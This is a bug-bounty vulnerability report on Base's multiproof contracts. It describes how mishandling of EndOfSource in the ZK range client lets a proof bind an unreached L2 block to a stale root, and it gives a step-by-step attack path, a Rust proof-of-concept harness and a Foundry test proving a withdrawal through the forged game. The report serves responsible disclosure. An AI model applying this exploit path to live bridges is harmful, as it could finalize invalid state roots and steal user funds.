# 76065 sc medium endofsource handling lets a zk range proof claim an unreached l2 block

**Submitted on May 2nd 2026 at 13:45:18 UTC by @Paludo0x for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76065
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/base/contracts/tree/v8.1.0/src/multiproof>
* **Impacts:**
  * Forging or bypassing TEE or ZK proof verification in AggregateVerifier to finalize an invalid state root on L1

## Description

## Brief/Intro

The ZK range client can return success without deriving the L2 block it is supposed to prove. The bug is a cross subsystem failure between the range proof boot inputs, `advance_to_target()`, and the `AggregateVerifier` journal binding: `EndOfSource` is converted into success because the post-Isthmus guard checks an L2 block number as if it were a timestamp. The result is a valid ZK journal that can bind an unreached target block to the stale safe-head output root.

## Vulnerability Details

The range proof is supposed to start from an agreed safe output root, derive blocks until `claimed_l2_block_number`, compute the target output root, and compare it with `claimed_l2_output_root`. If derivation cannot reach the target because the L1 data source is exhausted, the proof must fail. In rc.28 it does not always fail: the client rewrites the target to the current safe head and then returns success.

### Attack path

1. A proposer chooses a real but insufficient L1 origin/checkpoint, so the derivation source ends before the claimed L2 target block.
2. The range client enters `advance_to_target()` with `target = claimed_l2_block_number`.
3. The pipeline returns `EndOfSource`.
4. `advance_to_target()` changes `target` to the current safe head block number.
5. The intended post-Isthmus rejection does not trigger because it passes `l2_safe_head.block_info.number` to `cfg.is_isthmus_active()`, which expects a timestamp.
6. The function loops once and returns success for the safe head, not for the originally claimed target.
7. `WitnessExecutor::run()` compares the stale safe head output root against `claimed_l2_output_root`; if the claim was set to the safe head root, the check passes.
8. The range program commits a journal whose `l2BlockNumber` is still the original claimed target, while `l2PostRoot` is the stale safe head root.
9. Aggregation and `AggregateVerifier` bind that journal into the ZK proof path, allowing the invalid root claim to be treated as proved.

### Step-by-step vulnerability explanation

`BootInfo` marks the claimed output root and target block as user submitted inputs that must be verified by execution.

```rust
// crates/proof/proof/src/boot.rs:121
pub claimed_l2_output_root: B256;

// crates/proof/proof/src/boot.rs:136
pub claimed_l2_block_number: u64;
```

The range client is the verifier for these fields. It must not succeed unless it has actually derived the target block.

The failure is in `advance_to_target()`. On `EndOfSource`, it rewrites the requested target to the current safe-head block.

```rust
// crates/succinct/utils/client/src/client.rs:95
Err(PipelineErrorKind::Critical(PipelineError::EndOfSource)) => {
    warn!(target: "client", "Exhausted data source; Halting derivation and using current safe head.");

    if target.is_some() {
        target = Some(tip_cursor.l2_safe_head.block_info.number);
    };

    if cfg.is_isthmus_active(driver.cursor.read().l2_safe_head().block_info.number) {
        return Err(PipelineError::EndOfSource.crit().into());
    }
    continue;
}
```

The last check is meant to make this behavior invalid after Isthmus/interoperability rules. It is ineffective because `is_isthmus_active()` expects a timestamp, but the code passes the L2 block number. On Base Sepolia, a timestamp is around `1_776_708_000`, while the L2 block number is around `40_000_000`, so the check returns false and the error is suppressed.

`WitnessExecutor::run()` then treats the returned safe head root as the proof result. It only compares the returned root with the `claimed_l2_output_root` supplied by user; it does not check that the returned block number is still the requested target.

```rust
// crates/succinct/utils/client/src/witness/executor.rs:158
let (safe_head, output_root, intermediate_roots) = advance_to_target(
    &mut driver,
    rollup_config.as_ref(),
    Some(boot.claimed_l2_block_number),
    intermediate_root_interval,
)
.await?;

// crates/succinct/utils/client/src/witness/executor.rs:172
if output_root != boot.claimed_l2_output_root {
    return Err(anyhow!(
        "Failed to validate L2 block #{number} with claimed output root {claimed_output_root}. Got {output_root} instead",
        number = safe_head.block_info.number,
        output_root = output_root,
        claimed_output_root = boot.claimed_l2_output_root,
    ));
}
```

This check can be satisfied by setting `claimed_l2_output_root` to the agreed safe head output root. The returned `safe_head.block_info.number` may be lower than `boot.claimed_l2_block_number`, but that mismatch is not rejected.

The range program commits the original boot info after `run()` succeeds. The committed public values therefore keep the claimed target block, even though derivation stopped at the safe head.

```rust
// crates/succinct/programs/range/utils/src/lib.rs:43
let (boot_info, input, l2_pre_block_number) =
    get_inputs_for_pipeline(Arc::clone(&oracle)).await.unwrap();

// crates/succinct/programs/range/utils/src/lib.rs:63
executor
    .run(boot_info, pipeline, cursor, l2_provider, intermediate_root_interval)
    .await
    .unwrap()
```

`BootInfoStruct::new()` uses `boot_info.claimed_l2_block_number` and `boot_info.claimed_l2_output_root` for the final journal. It does not use the lower `safe_head.block_info.number` returned by `advance_to_target()`.

The onchain `AggregateVerifier` then binds the ZK proof to that journal hash.

```solidity
// contracts/src/multiproof/AggregateVerifier.sol:917
bytes32 journal = keccak256(
    abi.encodePacked(
        proposer,
        l1OriginHash,
        startingRoot,
        startingL2SequenceNumber,
        endingRoot,
        endingL2SequenceNumber,
        intermediateRoots,
        CONFIG_HASH,
        ZK_RANGE_HASH
    )
);

// contracts/src/multiproof/AggregateVerifier.sol:932
if (!ZK_VERIFIER.verify(proofBytes, ZK_AGGREGATE_HASH, journal)) revert InvalidProof();
```

The failure is that the ZK client can produce public values for a target block it never reached. `AggregateVerifier._verifyL1Origin` (`contracts/src/multiproof/AggregateVerifier.sol:963`) constrains `l1OriginHash` to match an actual L1 blockhash within \~8192 blocks (EIP-2935 window, \~27 hours), but this does not mitigate the bug: the attacker chooses any recent valid `l1_head` and sets `claimed_l2_block_number` arbitrarily higher than the L2 blocks derivable from that L1 head. The pipeline reaches `EndOfSource` regardless of `l1_head` recency, the buggy guard suppresses the error, and the journal is committed.

## Impact Details

For the Smart Contract asset, this maps to the Critical impact `Forging or bypassing TEE or ZK proof verification in AggregateVerifier to finalize an invalid state root on L1`. The proof is cryptographically valid for the program execution, but the program did not verify the semantic claim. It accepted the safe head root as the output root for a later claimed L2 block. The onchain sink is `AggregateVerifier`. Once the ZK verifier accepts a proof for that journal, `AggregateVerifier` treats the root claim as proved and `OptimismPortal2.proveWithdrawalTransaction()` can use the resulting game as the root validity source for withdrawals.

The practical attack is to create or support an AggregateVerifier game for the next interval using a stale safe head root as `rootClaim`, while selecting an L1 origin/checkpoint that is real but does not contain enough data to derive the claimed target. The ZK range client should reject that as "target not derivable"; instead, it can commit the stale root for the claimed target block. If this proof is submitted through the ZK path, the dispute game can treat an invalid state root as proved.

This does not require compromising a TEE signer, a governance key, or a private prover key. It uses normal proof inputs and an under-constrained success path in the public ZK range client.

## Proof of Concept

The exploit requires two demonstrations. The off-chain prover must produce the unsafe journal (PoC 1, Rust). The on-chain stack must accept that journal without any additional semantic check (PoC 2, Foundry). Together they form the full chain from the buggy `advance_to_target()` to a withdrawal-valid game accepted by `OptimismPortal2`.

{% stepper %}
{% step %}

## PoC 1: off-chain prover (Rust)

Run:

```bash
cargo +1.93.1 \
  --config 'target.x86_64-unknown-linux-gnu.rustflags=["-C", "link-arg=-fuse-ld=bfd"]' \
  test -p base-succinct-client-utils \
  --test audit_end_of_source_target_truncation \
  -- --nocapture
```

The PoC builds a minimal driver whose pipeline always returns `EndOfSource`. It uses the real Base Sepolia rollup config and sets the safe-head timestamp after Isthmus activation. The test proves three facts:

1. `cfg.is_isthmus_active(safe_timestamp)` is true.
2. `cfg.is_isthmus_active(safe_number)` is false, matching the production bug.
3. `advance_to_target()` returns success at `safe_number` even though the requested `target_number` is higher.

The final assertion constructs the same `BootInfoStruct` committed by the range program and shows the unsafe public value:

```
l2PreBlockNumber = safe_number
l2BlockNumber    = target_number
l2PostRoot       = safe_output_root
```

So the proof journal can claim an unreached target block while carrying the stale safe-head root.
{% endstep %}

{% step %}

## PoC 2: on-chain sink (Foundry)

Run from the `base/contracts` scope repo:

```bash
forge test --match-path test/audit/BaseAzulEndOfSourceJournalBoundPortalPoC.t.sol
```

This PoC models the SP1 verifier boundary with a journal-bound verifier. It is not an always true mock: it returns true only for the exact `imageId`, proof bytes, and journal that `AggregateVerifier` reconstructs. The test first sets a wrong journal and proves that game creation reverts with `InvalidProof`. It then sets the exact ZK journal for the claimed root and proves the on-chain sink:

1. `AggregateVerifier.initializeWithInitData()` accepts the journal-bound ZK proof.
2. The game has `zkProver == address(this)` and `proofCount == 1`.
3. `OptimismPortal2.proveWithdrawalTransaction()` accepts the game whose root claim equals the output root proof.
4. `provenWithdrawals[withdrawalHash][submitter]` stores this `AggregateVerifier` game.
5. After the game resolves as `DEFENDER_WINS`, `AnchorStateRegistry.isGameClaimValid(game)` returns true.

This closes the smart contract leg of the exploit. If the offchain ZK client emits the unsafe journal shown by PoC 1, the L1 contracts have no later check that the claimed L2 block was actually reached by derivation.
{% endstep %}
{% endstepper %}

### POC1 - RUST

```rust
//! Audit harness for EndOfSource handling in the zk range client.

use std::{convert::Infallible, fmt::Debug, sync::Arc};

use alloy_consensus::{Header, Sealable, Sealed};
use alloy_primitives::{Address, B256};
use async_trait::async_trait;
use base_common_rpc_types_engine::BasePayloadAttributes;
use base_consensus_derive::{
    OriginProvider, Pipeline, PipelineError, PipelineErrorKind, PipelineResult, Signal,
    SignalReceiver, StepResult,
};
use base_consensus_genesis::{RollupConfig, SystemConfig};
use base_consensus_registry::Registry;
use base_proof::BootInfo;
use base_proof_driver::{Driver, DriverPipeline, Executor, PipelineCursor, TipCursor};
use base_proof_executor::BlockBuildingOutcome;
use base_protocol::{AttributesWithParent, BlockInfo, L2BlockInfo};
use base_succinct_client_utils::{boot::BootInfoStruct, client::advance_to_target};
use spin::RwLock;

#[derive(Debug)]
struct EndOfSourcePipeline {
    rollup_config: RollupConfig,
    origin: BlockInfo,
}

impl Iterator for EndOfSourcePipeline {
    type Item = AttributesWithParent;

    fn next(&mut self) -> Option<Self::Item> {
        None
    }
}

impl OriginProvider for EndOfSourcePipeline {
    fn origin(&self) -> Option<BlockInfo> {
        Some(self.origin)
    }
}

#[async_trait]
impl SignalReceiver for EndOfSourcePipeline {
    async fn signal(&mut self, _signal: Signal) -> PipelineResult<()> {
        Ok(())
    }
}

#[async_trait]
impl Pipeline for EndOfSourcePipeline {
    fn peek(&self) -> Option<&AttributesWithParent> {
        None
    }

    async fn step(&mut self, _cursor: L2BlockInfo) -> StepResult {
        StepResult::StepFailed(PipelineError::EndOfSource.crit())
    }

    fn rollup_config(&self) -> &RollupConfig {
        &self.rollup_config
    }

    async fn system_config_by_number(
        &mut self,
        _number: u64,
    ) -> Result<SystemConfig, PipelineErrorKind> {
        unreachable!("system config lookup is not used by this EndOfSource harness")
    }
}

#[async_trait]
impl DriverPipeline<EndOfSourcePipeline> for EndOfSourcePipeline {
    fn flush(&mut self) {}

    async fn produce_payload(
        &mut self,
        _l2_safe_head: L2BlockInfo,
    ) -> Result<AttributesWithParent, PipelineErrorKind> {
        Err(PipelineError::EndOfSource.crit())
    }
}

#[derive(Debug)]
struct NoopExecutor;

#[async_trait]
impl Executor for NoopExecutor {
    type Error = Infallible;

    async fn wait_until_ready(&mut self) {}

    fn update_safe_head(&mut self, _header: Sealed<Header>) {}

    async fn execute_payload(
        &mut self,
        _attributes: BasePayloadAttributes,
    ) -> Result<BlockBuildingOutcome, Self::Error> {
        unreachable!("payload execution is not reached when the pipeline returns EndOfSource")
    }

    fn compute_output_root(&mut self) -> Result<B256, Self::Error> {
        unreachable!("output root computation is not reached when no payload is executed")
    }
}

fn safe_head(number: u64, timestamp: u64, origin: BlockInfo) -> L2BlockInfo {
    L2BlockInfo {
        block_info: BlockInfo::new(B256::repeat_byte(0x22), number, B256::repeat_byte(0x11), timestamp),
        l1_origin: origin.id(),
        seq_num: 0,
    }
}

fn driver_at_safe_head(
    cfg: RollupConfig,
    safe_head: L2BlockInfo,
    output_root: B256,
    origin: BlockInfo,
) -> Driver<NoopExecutor, EndOfSourcePipeline, EndOfSourcePipeline> {
    let header = Header {
        number: safe_head.block_info.number,
        timestamp: safe_head.block_info.timestamp,
        ..Default::default()
    }
    .seal_slow();

    let mut cursor = PipelineCursor::new(cfg.channel_timeout, origin);
    cursor.advance(origin, TipCursor::new(safe_head, header, output_root));

    Driver::new(
        Arc::new(RwLock::new(cursor)),
        NoopExecutor,
        EndOfSourcePipeline { rollup_config: cfg, origin },
    )
}

#[tokio::test]
async fn post_isthmus_end_of_source_returns_success_for_unreached_target_block() {
    let cfg = Registry::rollup_config(84532).expect("Base Sepolia config must exist").clone();
    let isthmus_timestamp = cfg.hardforks.isthmus_time.expect("Base Sepolia Isthmus must exist");
    let safe_timestamp = isthmus_timestamp + 1_000;
    let safe_number = 40_000_000;
    let target_number = safe_number + 12;
    let safe_output_root = B256::repeat_byte(0x44);
    let origin = BlockInfo::new(B256::repeat_byte(0x33), 1_000, B256::repeat_byte(0x32), safe_timestamp);

    assert!(cfg.is_isthmus_active(safe_timestamp), "the safe head timestamp is post-Isthmus");
    assert!(
        !cfg.is_isthmus_active(safe_number),
        "the buggy check passes the L2 block number as a timestamp"
    );

    let safe = safe_head(safe_number, safe_timestamp, origin);
    let mut driver = driver_at_safe_head(cfg.clone(), safe, safe_output_root, origin);

    let (returned_head, returned_root, intermediate_roots) =
        advance_to_target(&mut driver, &cfg, Some(target_number), 10)
            .await
            .expect("bug: EndOfSource is silently converted into success");

    assert_eq!(returned_head.block_info.number, safe_number);
    assert_ne!(
        returned_head.block_info.number, target_number,
        "the client returned success without deriving the requested target block"
    );
    assert_eq!(returned_head.block_info.timestamp, safe_timestamp);
    assert_eq!(returned_root, safe_output_root);
    assert!(intermediate_roots.is_empty());

    // The range program commits BootInfoStruct::new(boot_info, pre_block, roots).
    // Because run() returns the original boot_info after advance_to_target succeeds,
    // the journal can claim target_number while carrying the safe-head root.
    let boot_info = BootInfo {
        l1_head: origin.hash,
        agreed_l2_output_root: safe_output_root,
        claimed_l2_output_root: safe_output_root,
        claimed_l2_block_number: target_number,
        chain_id: 84532,
        rollup_config: cfg.clone(),
        l1_config: Registry::l1_config(cfg.l1_chain_id).expect("Base Sepolia L1 config exists").clone(),
        proposer: Address::repeat_byte(0x42),
        intermediate_block_interval: 10,
        l1_head_number: origin.number,
    };
    let committed = BootInfoStruct::new(boot_info, safe_number, intermediate_roots);

    assert_eq!(committed.l2PreBlockNumber, safe_number);
    assert_eq!(committed.l2BlockNumber, target_number);
    assert_eq!(
        committed.l2PostRoot, safe_output_root,
        "the committed journal binds the unreached target block to the stale safe-head root"
    );
}
```

### POC2 - SOLIDITY

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import { EIP1967Helper } from "test/mocks/EIP1967Helper.sol";
import { OptimismPortal2_TestInit } from "test/L1/OptimismPortal2.t.sol";

import { IAnchorStateRegistry } from "interfaces/dispute/IAnchorStateRegistry.sol";
import { IDelayedWETH } from "interfaces/dispute/IDelayedWETH.sol";
import { IDisputeGame } from "interfaces/dispute/IDisputeGame.sol";
import { IVerifier } from "interfaces/multiproof/IVerifier.sol";

import { AnchorStateRegistry } from "src/dispute/AnchorStateRegistry.sol";
import { OptimismPortal2 } from "src/L1/OptimismPortal2.sol";
import { Claim, GameStatus, GameType, Proposal } from "src/dispute/lib/Types.sol";
import { AggregateVerifier } from "src/multiproof/AggregateVerifier.sol";
import { MockVerifier } from "src/multiproof/mocks/MockVerifier.sol";

contract JournalBoundZkVerifier is IVerifier {
    bool public nullified;
    bytes32 public expectedImageId;
    bytes32 public expectedJournal;
    bytes32 public expectedProofHash;

    function setExpected(bytes32 imageId, bytes32 journal, bytes32 proofHash) external {
        expectedImageId = imageId;
        expectedJournal = journal;
        expectedProofHash = proofHash;
    }

    function verify(bytes calldata proofBytes, bytes32 imageId, bytes32 journal) external view returns (bool) {
        if (nullified) return false;

        // Bind the simulated SP1 proof to the exact journal that AggregateVerifier reconstructs.
        return imageId == expectedImageId && journal == expectedJournal && keccak256(proofBytes) == expectedProofHash;
    }

    function nullify() external {
        nullified = true;
    }
}

contract BaseAzulEndOfSourceJournalBoundPortalPoC is OptimismPortal2_TestInit {
    GameType internal constant AZUL_MULTIPROOF_GAME_TYPE = GameType.wrap(621);
    uint256 internal constant AZUL_BLOCK_INTERVAL = 600;
    uint256 internal constant AZUL_INTERMEDIATE_BLOCK_INTERVAL = 30;
    uint256 internal constant AZUL_PROOF_THRESHOLD = 1;
    uint256 internal constant AZUL_INIT_BOND = 0.05 ether;

    bytes32 internal constant TEE_IMAGE_HASH = keccak256("tee-image");
    bytes32 internal constant ZK_RANGE_HASH = keccak256("zk-range");
    bytes32 internal constant ZK_AGGREGATE_HASH = keccak256("zk-aggregate");
    bytes32 internal constant CONFIG_HASH = keccak256("config");

    JournalBoundZkVerifier internal journalVerifier;
    AggregateVerifier internal azulGame;

    function setUp() public override {
        super.setUp();

        // Mirror the Azul deployment shape relevant to the Portal path: zero maturity/finality delays.
        EIP1967Helper.setImplementation(address(optimismPortal2), address(new OptimismPortal2(0)));
        EIP1967Helper.setImplementation(address(anchorStateRegistry), address(new AnchorStateRegistry(0)));

        MockVerifier teeVerifier = new MockVerifier(IAnchorStateRegistry(address(anchorStateRegistry)));
        journalVerifier = new JournalBoundZkVerifier();

        AggregateVerifier aggregateVerifierImpl = new AggregateVerifier({
            gameType_: AZUL_MULTIPROOF_GAME_TYPE,
            anchorStateRegistry_: IAnchorStateRegistry(address(anchorStateRegistry)),
            delayedWETH: IDelayedWETH(payable(address(delayedWeth))),
            teeVerifier: IVerifier(address(teeVerifier)),
            zkVerifier: IVerifier(address(journalVerifier)),
            teeImageHash: TEE_IMAGE_HASH,
            zkHashes: AggregateVerifier.ZkHashes({ rangeHash: ZK_RANGE_HASH, aggregateHash: ZK_AGGREGATE_HASH }),
            configHash: CONFIG_HASH,
            l2ChainId: deploy.cfg().l2ChainID(),
            blockInterval: AZUL_BLOCK_INTERVAL,
            intermediateBlockInterval: AZUL_INTERMEDIATE_BLOCK_INTERVAL,
            proofThreshold: AZUL_PROOF_THRESHOLD
        });

        disputeGameFactory.setImplementation(AZUL_MULTIPROOF_GAME_TYPE, IDisputeGame(address(aggregateVerifierImpl)));
        disputeGameFactory.setInitBond(AZUL_MULTIPROOF_GAME_TYPE, AZUL_INIT_BOND);

        vm.prank(optimismPortal2.guardian());
        anchorStateRegistry.setRespectedGameType(AZUL_MULTIPROOF_GAME_TYPE);
        vm.warp(anchorStateRegistry.retirementTimestamp() + 1);
    }

    function test_POC_journalBoundZkGameCanBackPortalWithdrawalProof() public {
        bytes memory zkProofBytes = abi.encodePacked("sp1-proof-bound-to-end-of-source-journal");
        GameParams memory params = _gameParamsForOutputRoot(_outputRoot);

        bytes32 wrongJournal = keccak256(abi.encode("wrong journal"));
        journalVerifier.setExpected(ZK_AGGREGATE_HASH, wrongJournal, keccak256(zkProofBytes));

        vm.expectRevert(AggregateVerifier.InvalidProof.selector);
        _createZkGame(params, zkProofBytes);

        // A verifier that accepts only the exact AggregateVerifier journal now lets the game initialize.
        journalVerifier.setExpected(ZK_AGGREGATE_HASH, params.journal, keccak256(zkProofBytes));
        uint256 gameIndex = _createZkGame(params, zkProofBytes);

        assertEq(azulGame.rootClaim().raw(), _outputRoot, "game root matches Portal output root proof");
        assertEq(azulGame.zkProver(), address(this), "journal-bound ZK proof accepted");
        assertEq(azulGame.proofCount(), 1, "single ZK proof meets deployed threshold");

        vm.warp(block.timestamp + 1);
        optimismPortal2.proveWithdrawalTransaction({
            _tx: _defaultTx,
            _disputeGameIndex: gameIndex,
            _outputRootProof: _outputRootProof,
            _withdrawalProof: _withdrawalProof
        });

        (IDisputeGame provenGame, uint64 provenAt) = optimismPortal2.provenWithdrawals(_withdrawalHash, address(this));
        assertEq(address(provenGame), address(azulGame), "Portal stored the AggregateVerifier game as root validity");
        assertGt(provenAt, uint64(azulGame.createdAt().raw()), "withdrawal was proven after game creation");

        vm.warp(azulGame.expectedResolution().raw() + 1);
        azulGame.resolve();
        assertEq(uint8(azulGame.status()), uint8(GameStatus.DEFENDER_WINS), "journal-bound root resolved as valid");

        // AnchorStateRegistry treats same-timestamp resolution as not finalized even with a zero finality delay.
        vm.warp(block.timestamp + 1);
        assertTrue(
            anchorStateRegistry.isGameClaimValid(IDisputeGame(address(azulGame))),
            "Portal finalization gate accepts the resolved journal-bound game"
        );
    }

    struct GameParams {
        uint256 l2BlockNumber;
        bytes32 l1OriginHash;
        uint256 l1OriginNumber;
        bytes intermediateRoots;
        bytes extraData;
        bytes32 journal;
    }

    function _gameParamsForOutputRoot(bytes32 outputRoot) internal view returns (GameParams memory params) {
        Proposal memory start = anchorStateRegistry.getStartingAnchorRoot();
        params.l2BlockNumber = start.l2SequenceNumber + AZUL_BLOCK_INTERVAL;
        params.l1OriginHash = blockhash(block.number - 1);
        params.l1OriginNumber = block.number - 1;
        params.intermediateRoots =
            _intermediateRootsEndingWith(outputRoot, AZUL_BLOCK_INTERVAL / AZUL_INTERMEDIATE_BLOCK_INTERVAL);
        params.extraData =
            abi.encodePacked(params.l2BlockNumber, address(anchorStateRegistry), params.intermediateRoots);
        params.journal = _zkJournal({
            proposer: address(this),
            l1OriginHash: params.l1OriginHash,
            startingRoot: start.root.raw(),
            startingL2SequenceNumber: uint64(start.l2SequenceNumber),
            endingRoot: outputRoot,
            endingL2SequenceNumber: uint64(params.l2BlockNumber),
            intermediateRoots: params.intermediateRoots
        });
    }

    function _createZkGame(GameParams memory params, bytes memory zkProofBytes) internal returns (uint256 gameIndex) {
        bytes memory proof = abi.encodePacked(
            uint8(AggregateVerifier.ProofType.ZK), params.l1OriginHash, params.l1OriginNumber, zkProofBytes
        );

        vm.deal(address(this), AZUL_INIT_BOND);
        azulGame = AggregateVerifier(
            payable(address(
                    disputeGameFactory.createWithInitData{ value: AZUL_INIT_BOND }(
                        AZUL_MULTIPROOF_GAME_TYPE, Claim.wrap(_outputRoot), params.extraData, proof
                    )
                ))
        );

        gameIndex = disputeGameFactory.gameCount() - 1;
    }

    function _zkJournal(
        address proposer,
        bytes32 l1OriginHash,
        bytes32 startingRoot,
        uint64 startingL2SequenceNumber,
        bytes32 endingRoot,
        uint64 endingL2SequenceNumber,
        bytes memory intermediateRoots
    )
        internal
        pure
        returns (bytes32)
    {
        return keccak256(
            abi.encodePacked(
                proposer,
                l1OriginHash,
                startingRoot,
                startingL2SequenceNumber,
                endingRoot,
                endingL2SequenceNumber,
                intermediateRoots,
                CONFIG_HASH,
                ZK_RANGE_HASH
            )
        );
    }

    function _intermediateRootsEndingWith(bytes32 finalRoot, uint256 count) internal pure returns (bytes memory roots) {
        for (uint256 i = 1; i < count; i++) {
            roots = abi.encodePacked(roots, keccak256(abi.encode("intermediate root", i)));
        }
        roots = abi.encodePacked(roots, finalRoot);
    }
}
```
